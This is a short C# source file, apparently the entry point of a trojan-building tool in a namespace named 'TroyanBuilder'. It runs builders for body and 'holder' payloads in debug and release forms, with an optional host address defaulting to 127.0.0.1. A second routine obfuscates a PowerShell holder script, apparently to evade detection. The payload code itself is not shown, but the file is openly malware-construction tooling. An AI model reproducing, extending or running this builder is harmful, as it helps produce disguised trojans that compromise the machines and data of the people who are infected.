namespace TroyanBuilder;

class Program
{
    static void Clean()
    {
        string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Hephaestus");

        if (Directory.Exists(path))
        {
            foreach (var file in Directory.GetFiles(path)) File.Delete(file);
            foreach (var dir in Directory.GetDirectories(path)) Directory.Delete(dir, true);
            Console.WriteLine("Contents deleted.");
        }

    }
    static void Main2()
    {
        Clean();
        var data = System.IO.File.ReadAllText(@"C:\soft\hephaestus\troyan\_output\holder.debug.ps1");
        data = new PowerShellObfuscator().Obfuscate(data);
        System.IO.File.WriteAllText(@"C:\soft\hephaestus\troyan\_output\holder.ob.ps1", data);
    }
    
    static void Main(string[] args)
    {
        Clean();
        var arr = new CustomBuilder[]{new BodyBuilderDebug(), new BodyBuilderRelease(), new HolderBuilderDebug(), new HolderBuilderRelease()};
        foreach (var cb in arr)
        {
            Console.WriteLine(cb);
            var result = cb.Build(args.Length > 0 ? args[0] : "127.0.0.1");
            foreach (var line in result)
            {
                Console.WriteLine(line);    
            }
        }
    }
}